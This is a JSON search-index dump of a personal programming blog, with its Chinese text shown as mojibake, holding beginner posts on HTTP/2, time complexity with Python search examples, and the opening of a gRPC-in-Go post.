ä¸­ï¼Œå‰‡æ˜¯ä»¥æ˜æ–‡çš„æ–¹å¼å‚³è¼¸ã€‚å°‡è¨Šæ¯ç·¨ç¢¼æˆäºŒé€²åˆ¶é€²è¡Œå‚³è¼¸ï¼Œæ­¤ç‰¹æ€§æ˜¯ http/2 çš„å…¶ä»–ç‰¹æ€§çš„æ ¹æœ¬åŸºç¤ã€‚\nå†·çŸ¥è­˜ï¼šåœ¨ HTTP/1.1 å®šç¾©äº†å››ç¨®è§£æè¨Šæ¯çš„æ–¹å¼ï¼Œåœ¨ HTTP/2 åªéœ€è¦ä¸€ç¨®ã€‚\nç¸½çµ æ ¹æ“š w3Techs ç¶²ç«™ï¼Œç›®å‰ä½¿ç”¨http/2çš„ç¶²ç«™æœ‰45.7%ï¼Œæœªä¾†ç¢ºå¯¦æœƒè®Šæˆä¸»æµï¼Œèº«ç‚ºè»Ÿé«”å·¥ç¨‹å¸«ï¼Œé‚„æ˜¯å¤šå°‘ç†è§£ä¾†çš„å¥½ã€‚æ­¤ç¯‡æ–‡ç« åƒ…è¨˜éŒ„ç­†è€…è’é›†è³‡æ–™å½™æ•´çµæœï¼Œè‹¥æœ‰ä»»ä½•éŒ¯èª¤è³‡è¨Šé‚„è«‹ç›´æ¥é»å‡ºï¼Œè¬åˆ†æ„Ÿè¬ã€‚\n","date":"2022-07-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52276290470_787c77a1b5_o.jpg","permalink":"https://wayneblog.ga/2022-07-24/beginner-http-lesson/","title":"åˆå­¸è€…éƒ½è©²äº†è§£çš„ HTTP é€šè¨Šå”å®šåŸºç¤"},{"content":" åƒè€ƒç¶²ç«™ - åˆå­¸è€…å­¸æ¼”ç®—æ³•ï½œå¾æ™‚é–“è¤‡é›œåº¦èªè­˜å¸¸è¦‹æ¼”ç®—æ³•\næº«æ•…çŸ¥æ–° æ¼”ç®—æ³•çš„ç°¡å–®å®šç¾©ï¼šè¼¸å…¥ + æ¼”ç®—æ³• = è¼¸å‡º æ™‚é–“è¤‡é›œåº¦ï¼šè¡¡é‡æ¼”ç®—æ³•åŸ·è¡Œå¥½å£çš„å·¥å…· å¤§ O ç¬¦è™Ÿï¼šç”¨ä¾†æè¿°æ¼”ç®—æ³•åœ¨è¼¸å…¥ n å€‹æ±è¥¿æ™‚ï¼Œæ‰€éœ€æ™‚é–“èˆ‡ n çš„é—œä¿‚ åœ¨ n éå¸¸å¤§æ™‚ï¼Œå¥½çš„æ¼”ç®—æ³•è¨­è¨ˆå¯ä»¥çœä¸‹éå¸¸å¤šæ™‚é–“ æ¼”ç®—æ³•çš„é€Ÿåº¦ä¸æ˜¯ä»¥ç§’è¨ˆç®—ï¼Œè€Œæ˜¯ä»¥æ­¥é©Ÿæ¬¡æ•¸ å¯¦å‹™ä¸Šï¼Œæˆ‘å€‘åªæœƒç´€éŒ„æœ€é«˜æ¬¡æ–¹çš„é‚£ä¸€é …ï¼Œä¸¦å¿½ç•¥å…¶æ‰€æœ‰çš„ä¿‚æ•¸ ç›®éŒ„ï¼šå¸¸è¦‹çš„å…­ç¨®æ™‚é–“è¤‡é›œåº¦èˆ‡æ¼”ç®—æ³• O(1)ï¼šé™£åˆ—è®€å– O(n)ï¼šç°¡æ˜“æœå°‹ O(log n)ï¼šäºŒåˆ†æœå°‹ O(nlogn)ï¼šåˆä½µæ’åº O(nÂ²)ï¼šé¸æ“‡æ’åº O(2^n)ï¼šè²»æ³¢é‚£å¥‘æ•¸åˆ— O(1)ï¼šé™£åˆ—è®€å– èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(1) çš„æ¼”ç®—æ³•ï¼Œä»£è¡¨è‘—ä¸ç®¡ä½ è¼¸å…¥å¤šå°‘å€‹æ±è¥¿ï¼Œç¨‹å¼éƒ½æœƒåœ¨åŒä¸€å€‹æ™‚é–“è·‘å®Œã€‚åœ¨ç¨‹å¼è¨­è¨ˆä¸­ï¼Œæœ€ç°¡å–®çš„ä¾‹å­å°±æ˜¯è®€å–ä¸€å€‹é™£åˆ—ä¸­ç‰¹å®šç´¢å¼•å€¼çš„å…ƒç´ (ç¨‹å¼éº»ç“œå…ˆåˆ¥æ€¥è‘—åè¡€ï¼Œä¸”è®“æˆ‘å€‘åœ¨ä¸‹é¢æ…¢æ…¢èªªæ˜)ã€‚\né™£åˆ—è®€å– é™£åˆ—æ˜¯ç¨‹å¼ä¸­å„²å­˜æ±è¥¿çš„ä¸€ç¨®å®¹å™¨ï¼Œæˆ‘å€‘å¯ä»¥æƒ³åƒæˆä¸€æ’å·²ç¶“ç·¨è™Ÿå¥½çš„æ«ƒå­ã€‚æ¯ä¸€å€‹æ«ƒå­ä¸Šçš„ç·¨è™Ÿæˆ‘å€‘ç¨±ç‚ºã€Œç´¢å¼•å€¼ã€ï¼ˆIndexï¼Œåœ¨ç¨‹å¼ä¸­é€™å€‹ç·¨è™Ÿé€šå¸¸å¾ 0 é–‹å§‹ï¼‰ï¼Œè€Œæ«ƒå­è£¡çš„ç‰©å“æˆ‘å€‘ç¨±ç‚ºã€Œå…ƒç´ ã€ã€‚ä¾‹å¦‚ï¼šå‡è¨­ç¥å¥‡å¯¶è²å¤§å¸«å°æ˜åœ¨ä¸€å€‹åå« Pokemons çš„é™£åˆ—è£¡ä¾åºæ”¾å…¥ä»–çš„ç¥å¥‡å¯¶è²å€‘ï¼Œæˆ‘å€‘ä¾†è¤‡ç¿’ä¸€ä¸‹é™£åˆ—ã€å…ƒç´ ã€ç´¢å¼•å€¼çš„é—œä¿‚ï¼š\nåœ¨ç¨‹å¼ç¢¼ä¸­æˆ‘å€‘æŠŠä¸ƒéš»ç¥å¥‡å¯¶è²é€™æ¨£è¡¨é”ï¼š\n1 Pokemons = [\u0026#34;å¡ä¸˜\u0026#34;,\u0026#34;èƒ–ä¸\u0026#34;,\u0026#34;å°¼é¾œ\u0026#34;,\u0026#34;æ¯”ç¸\u0026#34;,\u0026#34;å‘†ç¸\u0026#34;,\u0026#34;ç¨®å­\u0026#34;,\u0026#34;å°å‰›\u0026#34;] é€™æ™‚ï¼Œå‡è¨­æˆ‘å€‘æƒ³è¦çŸ¥é“åœ¨é€™å€‹ Pokemons é™£åˆ—ä¸­ä»»ä¸€å€‹ç·¨è™Ÿæ‰€å°æ‡‰åˆ°çš„ç¥å¥‡å¯¶è²ï¼Œæˆ‘å€‘éƒ½åªéœ€è¦æŠŠé€™å€‹ç·¨è™Ÿå°æ‡‰çš„å…ƒç´ å°å‡ºä¾†ï¼Œå°±èƒ½çŸ¥é“å°æ‡‰çš„ç¥å¥‡å¯¶è²æ˜¯èª°äº†ã€‚å¦‚æœæˆ‘æƒ³çŸ¥é“é€™å€‹é™£åˆ—ä¸­çš„ç¬¬ n è™Ÿæ«ƒçš„ç¥å¥‡å¯¶è²æ˜¯èª°ï¼ˆä»¥ä¸‹å‡è¨­æˆ‘å€‘æƒ³çŸ¥é“ n= 0ï¼‰ï¼Œåœ¨ç¨‹å¼ç¢¼ä¸­æˆ‘å€‘å¯ä»¥é€™æ¨£è¡¨é”ï¼š\n1 2 3 4 n = 0 print(Pokemons[n]) \u0026gt;\u0026gt; \u0026#34;å¡ä¸˜\u0026#34; é™£åˆ—è®€å–æ™‚ï¼Œå› ç‚ºæˆ‘å€‘å·²ç¶“çŸ¥é“æ«ƒå­çš„ç´¢å¼•å€¼ï¼Œä¸ç®¡æ”¾å…¥çš„ n ç­‰æ–¼å¤šå°‘ï¼Œç¨‹å¼éƒ½å¯ä»¥åœ¨ â€œä¸€å€‹æ­¥é©Ÿâ€ å°±åˆ°é” n æ‰€å°æ‡‰åˆ°ç·¨è™Ÿçš„æ«ƒå­ä¸¦å–å‡ºè©²å…ƒç´ ï¼Œåƒé€™æ¨£çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘å°±æœƒèªªé™£åˆ—è®€å–æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦ç‚º O(1)ã€‚\nO(n)ï¼šç°¡æ˜“æœå°‹ èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(n) çš„æ¼”ç®—æ³•ï¼Œä»£è¡¨è‘—åŸ·è¡Œæ­¥é©Ÿæœƒè·Ÿè‘—è¼¸å…¥ n ç­‰æ¯”ä¾‹çš„å¢åŠ ã€‚ä¾‹å¦‚ç•¶ n = 8ï¼Œç¨‹å¼å°±æœƒåœ¨ 8 å€‹æ­¥é©Ÿå®Œæˆã€‚æœ€ç°¡å–®çš„ä¾‹å­ï¼Œå°±æ˜¯æ‰€è¬‚çš„ç°¡æ˜“æœå°‹ã€‚\né€™é‚Šè¦ç‰¹åˆ¥æé†’ä¸€é»ï¼Œé€šå¸¸ç¨‹å¼æ­¥é©Ÿçš„æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯ç”¨ç¨‹å¼åŸ·è¡Œæœƒç¢°åˆ°çš„æœ€å£ç‹€æ³ (Worst Case) ä¾†è¡¨ç¤ºï¼Œè©³ç´°ä¾‹å­æˆ‘å€‘å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ã€‚\nç°¡æ˜“æœå°‹ è®“æˆ‘å€‘æ²¿ç”¨ä¸Šä¸€æ®µçš„ Pokemons é™£åˆ—ä½œç‚ºä¾‹å­ã€‚Pokemons é€™ä¸€æ’æ«ƒå­è£¡æœ‰å…«éš»ç¥å¥‡å¯¶è²ï¼Œå‡è¨­æ¯å€‹æ«ƒå­çš„é–€éƒ½è¢«é—œä¸Šï¼Œæˆ‘å€‘äº‹å‰ä¹Ÿä¸çŸ¥é“å„å€‹ç¥å¥‡å¯¶è²çš„ä½ç½®ï¼Œé€™æ™‚å¦‚æœæƒ³è¦çŸ¥é“ã€Œå‘†ç¸ã€ç¥å¥‡å¯¶è²åœ¨å“ªè£¡æ™‚ï¼Œæˆ‘å€‘ç¬¬ä¸€å€‹æƒ³åˆ°çš„æ–¹æ³•æœƒæ˜¯ä»€éº¼å‘¢ï¼Ÿ\næœ€ç›´è§€åœ°æƒ³ï¼Œæˆ‘å€‘æœƒå¾ç¬¬ä¸€å€‹æ«ƒå­é–‹å§‹è©¦ï¼Œä¸€æ¬¡é–‹ä¸€å€‹æ«ƒå­ï¼Œç›´åˆ°æ‰¾åˆ°ã€Œå‘†ç¸ã€ç‚ºæ­¢ã€‚åƒé€™æ¨£çš„æœå°‹æ–¹æ³•ï¼Œå°±æ˜¯æœ€ç¶“å…¸ç°¡å–®çš„ã€Œç°¡æ˜“æœå°‹ã€ã€‚\nåœ¨ç¨‹å¼ç¢¼ä¸­ï¼Œç°¡æ˜“æœå°‹çš„æ–¹æ³•å¯ä»¥é€™æ¨£è¡¨é”ï¼š\n1 2 3 4 5 6 7 Pokemons = [\u0026#34;å¡ä¸˜\u0026#34;,\u0026#34;èƒ–ä¸\u0026#34;,\u0026#34;å°¼é¾œ\u0026#34;,\u0026#34;æ¯”ç¸\u0026#34;,\u0026#34;å‘†ç¸\u0026#34;,\u0026#34;ç¨®å­\u0026#34;,\u0026#34;å°å‰›\u0026#34;] for Pokemon in Pokemons: if Pokemon == \u0026#34;å‘†ç¸\u0026#34;: print(\u0026#34;æ‰¾åˆ°å‘†ç¸ï¼\u0026#34;) break else: print(\u0026#34;é€™å€‹æ«ƒå­è£¡ä¸æ˜¯å‘†ç¸\u0026#34;) è§€å¯Ÿä¸Šé¢çš„ç¨‹å¼ç¢¼æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼Œå¦‚æœå‘†ç¸åœ¨ç¬¬ 0 è™Ÿæ«ƒï¼Œæˆ‘å€‘ä¸€å€‹æ­¥é©Ÿå°±æœƒæ‰¾åˆ°å®ƒï¼Œä½†å¦‚æœä»–æ˜¯åœ¨ç¬¬ 6 è™Ÿæ«ƒï¼Œæˆ‘å€‘è¦èŠ±ä¸ƒå€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ°ä»–ã€‚\né‚„è¨˜å¾—æˆ‘å€‘åœ¨ä¸Šé¢æéçš„å°å°æé†’å—ï¼Ÿæˆ‘å€‘é€šå¸¸æœƒç”¨ç¨‹å¼åŸ·è¡Œæœƒç¢°åˆ°çš„ã€Œæœ€å£ç‹€æ³ã€ä¾†æ±ºå®šè¤‡é›œåº¦çš„è¡¨ç¤ºï¼Œä¹Ÿå› æ­¤ï¼Œç•¶æˆ‘å€‘è¦å¾ n å€‹æ«ƒå­ä¸­æ‰¾åˆ°ä¸€éš»ç‰¹å®šçš„ç¥å¥‡å¯¶è²ï¼Œæˆ‘å€‘æœ€æ…˜æœ€æ…˜çš„æƒ…æ³éœ€è¦èŠ±å‰›å¥½ n å€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ°ï¼ˆæƒ³åƒè¦æ‰¾çš„ç¥å¥‡å¯¶è²åœ¨æœ€å¾Œä¸€å€‹æ«ƒå­çš„æƒ…æ³ï¼‰ã€‚åƒé€™æ¨£çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘å°±æœƒèªªç°¡æ˜“æœå°‹æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦ç‚º O(n)ã€‚\nO(log n)ï¼šäºŒåˆ†æœå°‹æ³• èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(log n) çš„æ¼”ç®—æ³•ï¼ˆé€™é‚Šçš„ log éƒ½æ˜¯ä»¥äºŒç‚ºåº•ï¼‰ï¼Œä»£è¡¨ç•¶è¼¸å…¥çš„æ•¸é‡æ˜¯ n æ™‚ï¼ŒåŸ·è¡Œçš„æ­¥é©Ÿæ•¸æœƒæ˜¯ log nã€‚ï¼ˆè®“å¿˜è¨˜ log æ˜¯ä»€éº¼çš„åŒå­¸å€‘è¤‡ç¿’ä¸€ä¸‹ï¼Œç•¶ log n = x çš„æ„æ€æ˜¯ n = 2^xï¼Œå¦‚æœé€™éƒ¨åˆ†çš„è…¦ç´°èƒå°šæœªå¾©æ´»ï¼Œä¸”è®“æˆ‘å€‘å…ˆè¨˜ä½ n = 2^xï¼Œå†ä¾†çœ‹çœ‹ä¾‹å­ï¼‰ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ n = 4ï¼Œç¨‹å¼æœƒåœ¨ 2 å€‹æ­¥é©Ÿå®Œæˆï¼ˆ4 = 2Â²ï¼‰ï¼›n = 16 æ™‚ï¼Œç¨‹å¼æœƒåœ¨ 4 å€‹æ­¥é©Ÿå®Œæˆï¼ˆ16 = 2â´ï¼‰ï¼Œä»¥æ­¤é¡æ¨ã€‚\nåœ¨ç¨‹å¼ä¸­ï¼ŒO(log n) çš„æœ€å¸¸è¦‹ä¾‹å­æ˜¯äºŒåˆ†æœå°‹æ³•ã€‚\näºŒåˆ†æœå°‹æ³• å‡è¨­æˆ‘å€‘åœ¨ä¸€æœ¬å­—å…¸ä¸­æƒ³è¦æ‰¾åˆ°ä¸€å€‹å–®å­—ï¼Œé€™å€‹å­—ä»¥ W é–‹é ­ï¼Œæˆ‘å€‘å¯ä»¥ç”¨å‰é¢æéã€Œç°¡æ˜“æœå°‹ã€çš„é‚è¼¯ï¼Œå¾ç¬¬ä¸€é çš„ A é–‹å§‹æ‰¾èµ·ï¼Œä¸€å€‹ä¸€å€‹æ‰¾åˆ°å¤©è’åœ°è€æµ·æ¯çŸ³çˆ›ã€‚ä¹Ÿå¯ä»¥ç”¨æ›´çæƒœç”Ÿå‘½çš„æ–¹å¼ï¼Œç›´æ¥ç¿»åˆ°å­—å…¸çš„å¾Œé¢ï¼Œæ‰¾åˆ°ä»¥ W é–‹é ­çš„ç¬¬ä¸€å€‹å­—å¾Œå†é–‹å§‹å¾€å¾Œæ‰¾ã€‚\nåŒæ¨£çš„é‚è¼¯ï¼Œå‡è¨­æœ‰ä¸€é•·ä¸²æœ‰å°åˆ°å¤§æ’åºå¥½çš„æ•¸å­—å€‘ï¼Œæˆ‘è¦åœ¨å…¶ä¸­æ‰¾ç‰¹å®šä¸€å€‹æ•¸å­—ï¼Œæˆ‘å€‘ä¸€æ¨£å¯ä»¥å¾ç¬¬ä¸€å€‹å¾€å¾Œä¸€å€‹ä¸€å€‹æª¢æŸ¥ã€‚ä½†å‡è¨­æˆ‘å€‘æƒ³è¦æ›´çæƒœç”Ÿå‘½ï¼Œè°æ˜çš„è®€è€…å¯èƒ½å·²ç¶“æƒ³åˆ°äº†æˆ‘å€‘åœ¨ã€Œçµ‚æ¥µå¯†ç¢¼ã€é€™ç¨®éŠæˆ²ä¸­æœƒä½¿ç”¨çš„ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡éƒ½å…ˆæª¢æŸ¥æœ€ä¸­é–“çš„æ•¸å­—ï¼Œå¦‚æœä¸­é–“çš„æ•¸å­—æ¯”æˆ‘å€‘è¦æ‰¾çš„æ•¸å­—å¤§ï¼Œæˆ‘å€‘è¦æ‰¾çš„æ•¸é‡å°±åªå‰©åŸæœ¬çš„ä¸€åŠï¼ˆå› ç‚ºåœ¨å¾Œæ®µçš„æ•¸å­—é¡¯ç„¶éƒ½æœƒæ¯”æˆ‘å€‘è¦æ‰¾çš„æ•¸å­—å¤§ï¼‰ï¼Œé€™æ¨£çš„æ–¹æ³•ï¼Œå°±ç¨±ä½œäºŒåˆ†æœå°‹æ³•ã€‚\nèˆ‰ä¸€å€‹å¯¦éš›çš„ä¾‹å­ï¼Œå‡è¨­ä»Šå¤©æœ‰ä¸€æ’ç·¨è™Ÿå¥½çš„æ«ƒå­ï¼Œè£¡é¢æ“ºè‘—å…«å€‹ç”±å°åˆ°å¤§æ’åºå¥½çš„æ•¸å­—ã€‚å‡è¨­æˆ‘å€‘çŸ¥é“è£¡é¢çš„æ•¸å­—åŒ…å« 55ï¼Œä½†æˆ‘å€‘ä¸çŸ¥é“åœ¨å“ªä¸€å€‹ç·¨è™Ÿæ«ƒå­ä¸­ã€‚è®“æˆ‘å€‘ä¾†æ¯”è¼ƒç°¡æ˜“æœå°‹ï¼ˆå¾ç¬¬ä¸€æ ¼å¾€å¾Œä¸€å€‹ä¸€å€‹æª¢æŸ¥ï¼‰è·ŸäºŒåˆ†æœå°‹æ³•æœ‰ä»€éº¼å·®åˆ¥ã€‚\nå¾ä¸Šé¢çš„åœ–å¯ä»¥çœ‹åˆ°ï¼Œä¸€èˆ¬çš„æœå°‹æ–¹æ³•éœ€è¦èŠ±äº”å€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ° 55ã€‚\nè€Œåœ¨äºŒåˆ†æœå°‹æ³•ä¸­ï¼Œæˆ‘å€‘å…ˆæ‰“é–‹æœ€ä¸­é–“çš„æ«ƒå­ï¼Œç™¼ç¾è£¡é¢çš„æ•¸å­—æ˜¯ 41ã€‚å› ç‚º 55 æ¯” 41 å¤§ï¼Œå› æ­¤æˆ‘å€‘çŸ¥é“å¾ä¸€è™Ÿæ«ƒåˆ°ä¸‰è™Ÿæ«ƒéƒ½ä¸æœƒæœ‰ 55ï¼Œæ¥ä¸‹ä¾†åªéœ€è¦æª¢æŸ¥äº”è™Ÿæ«ƒåˆ°ä¸ƒè™Ÿæ«ƒã€‚\nåŒæ¨£çš„é‚è¼¯ï¼Œæˆ‘å€‘æ‰“é–‹å‰©ä¸‹ä¸‰å€‹å¯èƒ½æ€§ä¸­æœ€ä¸­é–“çš„æ«ƒå­ï¼Œç™¼ç¾å…­è™Ÿæ«ƒè£¡é¢çš„æ•¸å­—æ˜¯ 61ï¼Œå› ç‚º 61 æ¯” 55 å¤§ï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“ä¸ƒè™Ÿæ«ƒçš„æ•¸å­—ä¸€å®šä¹Ÿæ¯” 55 å¤§ï¼Œå¾—çŸ¥ 55 ä¸€å®šå°±åœ¨äº”è™Ÿæ«ƒä¹‹ä¸­ã€‚\næ¥ä¸‹ä¾†ï¼Œè¦å†æ¬¡ä¾†é—œå¿ƒå…©å€‹æœå°‹æ–¹æ³•çš„æ™‚é–“è¤‡é›œåº¦ã€‚ç°¡æ˜“æœå°‹çš„æƒ…æ³ä¸­ï¼Œæˆ‘å€‘å¯ä»¥è¼•é¬†åœ°çŸ¥é“æœ€å£çš„æƒ…æ³å°±æ˜¯å‰›å¥½ä¸ƒå€‹æ­¥é©Ÿï¼ˆè¦æ‰¾çš„æ•¸å­—æ˜¯ 80 ï¼‰ã€‚è€ŒäºŒåˆ†æœå°‹æ³•ï¼Œæˆ‘å€‘å¯ä»¥å…ˆç·´ç¿’å»è¨ˆç®—å„ç¨®æƒ…æ³éœ€è¦çš„æ­¥é©Ÿï¼Œè€Œæœ€çµ‚çš„ç­”æ¡ˆå¦‚ä¸‹è¡¨ï¼š\nå¾ä¸Šè¡¨æˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼ŒäºŒåˆ†æœå°‹æ³•æœ€æ…˜æœ€æ…˜ï¼Œä¹Ÿåªéœ€è¦ä¸‰å€‹æ­¥é©Ÿã€‚\næ¨å»£åˆ°æœ‰ n å€‹æ«ƒå­æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼šäºŒåˆ†æœå°‹æ³•åœ¨æ¯é€²è¡Œä¸€å€‹æ­¥é©Ÿæ™‚ï¼Œå°±å¯ä»¥æ’é™¤æ‰ä¸€åŠçš„å¯èƒ½æ€§ã€‚æ¯æ¬¡éƒ½èƒ½æ¸›å°‘ä¸€åŠï¼Œå› æ­¤äºŒåˆ†æœå°‹æ³•æœ€ç³Ÿæœ€ç³Ÿä¹Ÿåªéœ€è¦ä»¥ 2 ç‚ºåº•çš„ log n å€‹æ­¥é©Ÿå°±èƒ½å®Œæˆã€‚\näºŒåˆ†æœå°‹æ³•åœ¨ç¨‹å¼ç¢¼ä¸­çš„ä¾‹å­ï¼Œå°æ–¼ç¨‹å¼æ–°æ‰‹å¯èƒ½éœ€è¦èŠ±æ¯”è¼ƒå¤šçš„ç†è§£ã€‚å¦‚æœä½ æ˜¯å°ç¨‹å¼æœ‰ä¸€å®šç†è§£çš„äººï¼Œå¯ä»¥å˜—è©¦å‹•æ‰‹å¯¦åšçœ‹çœ‹ã€‚è€Œå¦‚æœä¸‹æ–¹çš„ç¨‹å¼ç¢¼å°æ–¼è®€è€…é‚„æœ‰äº›åƒåŠ›çš„è©±ï¼Œä¹Ÿå¯ä»¥å…ˆå¤šå¤šç†Ÿæ‚‰èªæ³•å¾Œå›ä¾†è¤‡ç¿’å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Numbers = [5,17,33,41,55,61,80] Find = 55 â€‹ low = 0 high = len(Numbers) - 1 â€‹ while low \u0026lt;= high: mid = (low + high) // 2 if Numbers[mid] \u0026gt; Find: high = mid - 1 elif Numbers[mid] \u0026lt; Find: low = mid + 1 else: break â€‹ print(mid) å°çµ åœ¨é€™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å€‘åˆ†åˆ¥äº†è§£äº† O(1)ã€O(n)ã€O(logn) çš„æ™‚é–“è¤‡é›œåº¦ï¼Œä»¥åŠå°æ‡‰åˆ°çš„ä¸‰å€‹å¸¸è¦‹æ¼”ç®—æ³•ã€‚è€Œåœ¨æ¥ä¸‹ä¾†çš„æ–‡ç« ä¸­ï¼Œæˆ‘å€‘æœƒé–‹å§‹èªè­˜æ–°æœ‹å‹ï¼Œåœ¨æ¼”ç®—æ³•ä¸­ä½”æœ‰é‡è¦åœ°ä½çš„ã€Œæ’åºæ³•ã€ï¼Œä»¥åŠåœ¨æ›´é€²éšçš„ä¾‹å­ã€‚\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276285230_7f886f0bca_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/common-time-complexity/","title":"åˆå­¸è€…å­¸æ¼”ç®—æ³•ï½œå¾æ™‚é–“è¤‡é›œåº¦èªè­˜å¸¸è¦‹æ¼”ç®—æ³•"},{"content":" å‰›å‰›ç”¨æ—¥å¸¸ä¸Šç­å‰æŒ‘è¡£æœçš„ä¾‹å­å’Œæ²’å­¸éç¨‹å¼çš„ 00 èªªæ˜æ™‚é–“è¤‡é›œåº¦çš„æ¦‚å¿µå¾ˆå¥½ç†è§£è€¶ï½ï¼\nä¾‹å­æ˜¯é€™æ¨£çš„\u0026hellip;\nä¸€æ—©è¦å‡ºé–€çš„æ™‚å€™ï¼Œæƒ³è¦å¾è¡£æ«ƒä¸­æ‰¾å‡ºç´…è‰²çš„ä¸Šè¡£ã€‚\nå…¶ä¸­ä¸€ç¨®æ–¹å¼æ˜¯åƒå·¦åœ–ä¸€æ¨£ï¼Œé€™æ˜¯æå¯¶ä¸Šå¾ˆç†±é–€çš„ã€Œç–Šè¡£æœè¤²å­æ”¶ç´ç¥å™¨ã€ï¼Œé›–ç„¶çœ‹èµ·ä¾†æ•´ç†çš„å¾ˆä¹¾æ·¨ï¼Œä½†å¦‚æœä½ è¦å¾ä¸­æ‰¾åˆ°ç´…è‰²çš„è¡£æœï¼Œä½ å°±å¾—è¦ç”±ä¸Šè€Œä¸‹ä¸€ä»¶ä¸€ä»¶æ‰¾ï¼Œæœ€ç³Ÿçš„æƒ…æ³å°±æ˜¯ä¸€ç›´ç¿»åˆ°æœ€ä¸‹é¢æ‰èƒ½æ‰¾åˆ°ä½ è¦çš„ç´…è‰²è¡£æœã€‚\nå¦ä¸€ç¨®æ–¹å¼æ˜¯åƒå³åœ–ä¸€æ¨£ï¼ŒæŠŠè¡£æœç”¨ç«‹èµ·ä¾†çš„æ–¹å¼ï¼Œä¸€çœ¼å°±å¯ä»¥çœ‹åˆ°ç´…è‰²çš„è¡£æœåœ¨å“ªï¼Œç›´æ¥æ‹¿å‡ºä¾†ï¼Œå¹¾ä¹ä¸ç”¨æ‰¾ã€‚\nå·¦åœ–çš„é‚£ç¨®æ–¹å¼ï¼Œæ™‚é–“è¤‡é›œçš„å°±æ˜¯ O(n)ï¼Œn å°±æ˜¯è¡£æœçš„ä»¶æ•¸ï¼Œé›–ç„¶ç´…è‰²çš„è¡£æœæœ‰å¯èƒ½å°±æ”¾åœ¨æœ€ä¸Šé¢ï¼Œä¸€çœ¼å°±å¯ä»¥çœ‹åˆ°ï¼Œä½†åœ¨æ¢è¨æ™‚é–“è¤‡é›œåº¦çš„æ™‚å€™éƒ½è¦è€ƒæ…®æœ€å·®çš„æƒ…æ³ï¼Œæ‰€ä»¥å¦‚æœä½ æœ‰ n ä»¶è¡£æœï¼Œæœ€å·®çš„æƒ…æ³å°±æ˜¯è¦æŠŠ n ä»¶è¡£æœéƒ½ç¿»éæ‰æœƒæ‰¾åˆ°ç´…è‰²é‚£ä»¶ã€‚\nå³åœ–çš„æ–¹å¼å®ƒçš„æ™‚é–“è¤‡é›œåº¦æ˜¯ O(1)ï¼Œåœ¨ä½ æ²’æœ‰å¿˜è¨˜å…¶å¯¦è¡£æœå·²ç¶“è¢«ä¸Ÿåˆ°æ´—è¡£ç±ƒçš„å‰æä¸‹ï¼Œä½ çœ‹ä¸€çœ¼ï¼Œç¿»éƒ½ä¸ç”¨ç¿»å°±å¯ä»¥æŠŠç´…è¡£æœç›´æ¥å–å‡ºï¼ˆè«‹å…ˆå¿½ç•¥æ‰äººè…¦å…§å»ºçš„è¦–è¦ºæœå°‹ç³»çµ±ï¼Œé‚£æ˜¯å¦ä¸€å€‹æœ‰è¶£çš„æ•…äº‹ XDï¼‰ã€‚é€™ç¨®ä¸ç”¨ä¸€å€‹ä¸€å€‹æ‰¾ï¼Œå°±ç›´æ¥å–å‡ºçš„ï¼Œæ™‚é–“è¤‡é›œåº¦å°±æ˜¯ O(1)ã€‚\næœ‰äº†é€™å€‹æ™‚é–“è¤‡é›œåº¦çš„æ¦‚å¿µå¾Œï¼Œæ˜¯ä¸æ˜¯è¦ºå¾—å·¦é‚Šçš„é‚£å€‹å•†å“å¯¦ç”¨æ€§æ²’é€™éº¼é«˜å•¦ï½ XDD\nçœŸçš„æ˜¯æ²’æƒ³åˆ°å­¸æ¼”ç®—æ³•é‚„å¯ä»¥ç”¨åœ¨è³¼ç‰©å§ï¼\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276282210_c2a38fae3c_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/learn-time-complexity-by-clothes/","title":"å¾æ‰¾è¡£æœäº†è§£æ™‚é–“è¤‡é›œåº¦"},{"content":" åƒè€ƒç¶²ç«™ - gRPC èªªæ˜å½±ç‰‡ @ BESG\nSOURCE CODE\nå°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc çš„ repositoryã€‚\ngRPC æ˜¯ä»€éº¼ï¼šä»¥ Golang èªªæ˜èˆ‡å¯¦ä½œ èªªæ˜ RPC çš„å…¨åæ˜¯ remote procedure callï¼Œä¸»è¦æ˜¯ä½œç‚ºé›»è…¦å’Œé›»è…¦é–“æºé€šä½¿ç”¨ã€‚A é›»è…¦å¯ä»¥å‘¼å« B é›»è…¦åŸ·è¡ŒæŸäº›ç¨‹å¼ï¼ŒB é›»è…¦æœƒå°‡çµæœå›å‚³çµ¦ A é›»è…¦ï¼ŒA é›»è…¦åœ¨æ”¶åˆ°å›æ‡‰å¾Œæœƒå†ç¹¼çºŒè™•ç†å…¶ä»–ä»»å‹™ã€‚RPC çš„å¥½è™•åœ¨æ–¼ï¼Œé›–ç„¶ A é›»è…¦æ˜¯ç™¼é€è«‹æ±‚å»è«‹ B é›»è…¦åšäº‹ï¼Œä½†å…¶å‘¼å«çš„æ–¹å¼ï¼Œå°±å¾ˆåƒæ˜¯ A é›»è…¦ç›´æ¥åœ¨å‘¼å«è‡ªå·±å…§éƒ¨çš„å‡½å¼ä¸€èˆ¬ã€‚\ngRPC 